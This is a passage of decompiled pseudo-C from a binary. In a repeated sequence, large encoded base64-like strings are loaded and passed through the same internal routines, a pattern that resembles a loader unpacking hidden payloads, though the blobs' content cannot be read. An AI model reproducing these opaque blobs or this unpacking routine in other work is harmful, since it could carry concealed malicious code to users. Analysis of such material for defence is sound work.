UC9zm1JUtpGV2+WotCusnqZuDfItGAmSuV6FKJcegL6Nv/DlRszJo9t+msXyCSVxgLFCeEhObmWRLwdC+OW5+jRupEpJ5X1f3xPVxl4f4ndbpPUmZj8rksFEBj5GOA2FG/Joqyx4TLVbtU2NuN999JwL+JfNBmFqxcibDw1FO6bdAvvU6XWq1kfznLjFmV6o361OtA9epCw4/a4e+Z3KMzUmhe6mIlXu1WT4nlSPkh2yCgPaRVR/8cIQbAaMdcwns03Wme2FZc+KUPEiHemnfxM78uZkdHg+Rr+HPMxMhqTMCeL4Xhjjp1Mm8RZScOvD0oY0Vhmpp9X7W17RgXG1XONoZ9j9CHwW+kPSJ7Dz7HIIl0mL+SnMQ8xiFjwr33Jv9hMbBs1xvHPyZD3ikQT8SXgy5jTA/LVlfzGm/qrEWYk4k0XN/Stdb3Rti4kR0KPZ2/d+I5c2ca96Aiz1QWwNYehCP6S8lf5la5fbb7zY8M9i/wuNgVi1uvGs4kcv39pYF0SxA0A7f0OhICNO8v20nQsGAm2f3yRyuB70vuUUZWku+r5iWfonzMfy/L6UVis7HCc32YTUZO6BZ1J4OUHV1eJzFGww71jO5QbB30SG/f5J9n9cpEO5BaphOSBEYP1eM7TfRnYy+k99roPf5HbAjELaiUKe/pMuYhI6ZgBjoAq2JkqTCslyjpx4iZRSHnVZKPuGsLR88WhU/wA6aSt0our5K6YL5DWUZcHjvkAPaRgcjDeIOxsBmtQqXoIEflggPYqz6grQlbFjFtLEBCj+qrB5wLASKVR6IHnzbNq\"\n    ;\n    puStack356 = &stack0xfffffed8;\n    uStack360 = 0x40171d;\n    puStack356 = fcn.004028d0();\n    uStack240 = CONCAT31(uStack240._1_3_, 0xf);\n    pcStack348 = *0x4295b4;\n    uStack352 = NULL;\n    uStack360 = 0x401737;\n    fcn.004022b0();\n    uStack360 = 1;\n    pcStack252 = pcStack252 & 0xffffff00;\n    pcStack364 = 0x401746;\n    fcn.004024b0();\n    uStack368 = &stack0xfffffeb8;\n    pcStack364 = \n    \"wznfDnKpLEnRFoMVx4xMT+4SC/Suq5trxDjwQ0eY9vx9ENAcDpmYesKe938YPJoiH2Srh6k4SimgJtGVtz3+woM4d3A6ejqp31lzwIfzSS+HmNXFvIQPQzvp2FlxrLNmI3UNXyZDIfp08bBDvyzOJRpW7KEmnl96yGTa487JN5vdcLe3A6Lni2hPMkKkwcRYZMJF/H09mMQzZ8VAKhe1NIyk76Bsw3/Uv2IEyeonT9f+I8enNKupWWQkEMvbQvtWXS9737rAhrTYyU8ZPp9QjwHIVBj9yaRHrHHkeAqf5JDKuN1SJZNyi29en8dWor1L9Ucn6jmDNLiebIJI8ak4XXg7R4hK0597at22172p15FXDr0wXZun1sDx8aRJ7FK2hlDMJpni5/8PEKTc0qdjbS3lvpyzONfnnZbQWiZdhKuNnb0b6WbtIJVOHW/3rQ2lsMSNZB50JZk5U957KcDI96x05x8iqfrzpG55LPOz4Dedwz5dL9UjbjLiOKBsYh2pewAvEMmlMKvY9Hkjr1vWGQFChG7JI5Hp9+KYbie/nuVJ59bRoqOsg5fDNp5d6ErJK7NgJ8eNv9rwx9RWwM80ngs+acfzYvCzP9pjLo0YzvGWN76T3sZona34ukom2lK2yttlh8oCeHOQgWgr74RJ1D/Psl405ivvcuVxcMXXmPxgZMYfVDsOObgTyWawH5oitRwe/v6EsNCjpgW287YG7/34urLnCbCrhibu0H4F3nR2p1W7wFwPE+JMCuQYJ03TzWG+czDDa/fRJnXPp7Mhiw+smqydINA+O6fH1rN8pZXFJtyfpKKhI12MkFh9kdNEckj2l1VcodVJBHPS8D2qVJlxR6pttZSVOo1O3aqvSX8M0fNa8QXIUTe0MXW/YGnh+A0zLK4xjloT9QK2OaFKE+OgtnWyQmS90J+CjvrPxPcBFuXek2+pa/2wCFdol7s3sNOn7R96QLugHZehUyeSbVMCUQ5kITOPxnz2MQF/wmOb232x9r3zVCCfGKUcztRbpU9jxxVFHYyHE9FKo0fNH69UcROLCASn4bxL+U4bg3s5tOvGjXk45qSp29H9uL6qdeXGOSFdxxMXnTU8Ygbj1N8JKHGV1wFWbYw5g03sM6YeZcGFa/SVIyirUGA/hkmjMT/j3JhuLF2L6nN+SfzR6oFTk/e1C+3NLEiSbykyPO3ol9NlRnOpA477kpyvOFXPtpTSnEFNjSy2M9VcsmvlZ//EIU3vjbBTFOjSaMGcpkimQVKgZXq5Ys+oUbxYteqfP4DRWmbK2DfTtBPLdTWEJ785ohSa72+HWvdwc7vEQ6G1QB7D8gX8miVaACWomRwLf5NVnsOecFb1Ma5D/M1HdNTch7mqyneMxT5onz//R61gVagjmKnxu4vD8RXBTxpkIALkXUHLB5bO4a31uYEke5NbxZcc2b2i+yXJbvMotqOV2gZlEz44/pWLzETPZScIPo4liMXQBP6FOWNjVyMphtlqslbXLCVz/ERPBcdhsVTJxJ6ssOOCrwtJyuC5wKvF31h6GNCPFWjJMsgIJIfnkePQI66YQLquTYdYP5hLx74XJ5xwjdhJqzoYr1Rr1PnpWYYC/6kti4iGS6vQU699jgRrXIyg972pJ5DDm3j7jPFjoHus74jfCQNVM66glZjPr+E4txs4C5PcXUvW8KjEUKTZzQvZ2jbJBW3n7e3bxwyNJqiiSCyS98zu0MTjy4fPmxnNZ0xlutW3LQA0pyvd9bWtoKUQcTNmYRq7Th3VEI6cA8F9rTWrDHdBU2yam/qVBZkBycUanKdVJTLzTn9I0W78vM0zxCcmTZq4p+9TY7nlC8eU/Z45BzDMjL7kNOGto/LAmj/YLboI4FE2VLHDwhR6Rw0ybkurdODXDPLFtxqoUl/AyRRwb0gLqLXpsuQmSPHhE67kVrWyMOTlrZab2cyAYWSVavDEx9s7pmfukysYNf2Z3pu9PMJ+X+n85Uw9iWEZB4fxUDfnQyWJ\"\n    ;\n    puStack372 = &stack0xfffffec8;\n    uStack376 = 0x40175a;\n    puStack372 = fcn.004028d0();\n    uStack256 = CONCAT31(uStack256._1_3_, 0x10);\n    pcStack364 = *0x4295b4;\n    uStack368 = NULL;\n    uStack376 = 0x401774;\n    fcn.004022b0();\n    pcStack268 = pcStack268 & 0xffffff00;\n    uStack376 = 1;\n    pcStack380 = 0x401783;\n    fcn.004024b0();\n    uStack384 = &stack0xfffffea8;\n    pcStack380 = \n    \"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\"\n    ;\n    puStack388 = &stack0xfffffeb8;\n    uStack392 = 0x401797;\n    puStack388 = fcn.004028d0();\n    uStack272 = CONCAT31(uStack272._1_3_, 0x11);\n    pcStack380 = *0x4295b4;\n    uStack384 = NULL;\n    uStack392 = 0x4017b1;\n    fcn.004022b0();\n    uStack392 = 1;\n    pcStack284 = pcStack284 & 0xffffff00;\n    pcStack396 = 0x4017c0;\n    fcn.004024b0();\n    uStack400 = &stack0xfffffe98;\n    pcStack396 = \n    \"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\"\n    ;\n    puStack404 = &stack0xfffffea8;\n    uStack408 = 0x4017d4;\n    puStack404 = fcn.004028d0();\n    uStack288 = CONCAT31(uStack288._1_3_, 0x12);\n    pcStack396 = *0x4295b4;\n    uStack400 = NULL;\n    uStack408 = 0x4017ee;\n    fcn.004022b0();\n    uStack408 = 1;\n    pcStack300 = pcStack300 & 0xffffff00;\n    pcStack412 = 0x4017fd;\n    fcn.004024b0();\n    uStack416 = &stack0xfffffe88;\n    pcStack412 = \n    \"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\"\n    ;\n    puStack420 = &stack0xfffffe98;\n    uStack424 = 0x401811;\n    puStack420 = fcn.004028d0();\n    uStack304 = CONCAT31(uStack304._1_3_, 0x13);\n    pcStack412 = *0x4295b4;\n    uStack416 = NULL;\n    uStack424 = 0x40182b;\n    fcn.004022b0();\n    uStack424 = 1;\n    pcStack316 = pcStack316 & 0xffffff00;\n    pcStack428 = 0x40183a;\n    fcn.004024b0();\n    uStack432 = &stack0xfffffe78;\n    pcStack428 = \n    \"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\"\n    ;\n    puStack436 = &stack0xfffffe88;\n    uStack440 = 0x40184e;\n    puStack436 = fcn.004028d0();\n    uStack320 = CONCAT31(uStack320._1_3_, 0x14);\n    pcStack428 = *0x4295b4;\n    uStack432 = NULL;\n    uStack440 = 0x401868;\n    fcn.004022b0();\n    uStack440 = 1;\n    pcStack332 = pcStack332 & 0xffffff00;\n    pcStack444 = 0x401877;\n    fcn.004024b0();\n    uStack448 = &stack0xfffffe68;\n    pcStack444 = \n    \"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\"\n    ;\n    puStack452 = &stack0xfffffe78;\n    uStack456 = 0x40188b;\n    puStack452 = fcn.004028d0();\n    uStack336 = CONCAT31(uStack336._1_3_, 0x15);\n    pcStack444 = *0x4295b4;\n    uStack448 = NULL;\n    uStack456 = 0x4018a5;\n    fcn.004022b0();\n    uStack456 = 1;\n    pcStack348 = pcStack348 & 0xffffff00;\n    pcStack460 = 0x4018b4;\n    fcn.004024b0();\n    uStack464 = &stack0xfffffe58;\n    pcStack460 = \n    \"W+91S8D8EZOkQaPdjlGYH+sTw6YptuewpPegjPMRAXsNRikugEVILvP5Q8JK/+PniiaIPB6hVv7Dkbt29JbFsJWPVLuvIFKebuT72zX/1IQYKMRrx612y2cfXU05m8o717c7xBpPhRDImuclM4QYhXl13GaA5eeGtZ+K6KYQfBl1aOtAgh7LG9qhyP2LqypQs8cBYYeoh5hVQ/4s6ppgQ5tlcd+6fhXKFR+lX9JjO6uRpLGxiPPzUvwjObzmy/dHK6mtrVnSYyHf4cXPQSA6f/+Hs2UoVAJ77hB5eJ1TiyThqAeP5ChIQZrYh0tNMdOsSLrdvQ+1NXyEiNLDefXOvrzNc6XruyHJ1xtB8P6OTt4yrO+GCfPXrVsr61+LcqenWejo4xbSd+FaidvBg+QHaRQbCvE3Usizal+cGovB8kgIm72xL6eMQ635wIejA3Z1mtvXA9EhK130zRU7yfIMOSG77XcHdRjUgEQ9EM6U0fK9zqq5INOr81Wr4baaGqV4BP1jwZVy1EvmFZP8F+5hKw6iwmZ4dcQTFDN/C9HEdB0RivwXuVO/rYA3ByOQ/rDDJ7VElauUv9pEy9+2GC7RwWpIR9XK/4cEM9erVMiLFY6y384Yx/+zR8zw0Hounb1o38sDb3BsA8Stm0jnKMFfl9in7M7I36UfiZmCELlfQmX3I+pJLx/U0NHSwUXbu5quWlupq+N+//4vkFJWa/cmebqUO8vsGK092NsaLUORi4x5Vjiatf+lZ+de9m/5q1gUVTtbEAIyqn3OsEoxIIq9BUfXqYwXuwcsXIjRRr+Ayesch1UHq6sR+q6x4c85E2V1tp9p58MOOVMcauAuvLs9IDMq0RD55ii7aTrQR/mevTjrzeJGn6lmVNSl9ElSuNAnl65dQ5Gotlr3KEi2wPq25VEV/itFfvtGoITT5UFvOqGWTprtn7ooKObke5DK0nNIjqlfVpZ57ZF93LzqS5rmhxGtTyKr5wFGl+w3udKJjtsYnbCWCTA4b+fkoYO00DaBCclkOj5hiemqdZq1jxKk80JlHsLu1d4dmAeUDZp1muLRo1z9E8XLTYOLmGQY/BcB/lfavVHeA0Q3/5Gj8v6irbs3shKZN7k3ou9F5quUIWWJcx9p8IT1c6wg7MP3hBHmQ6ND6Dr92fpvjThuTH/jjVAPOZbr1IXfIC2Y6wXve++PkrNV2nQkBYL5Q3GC3+fIn5HEKRb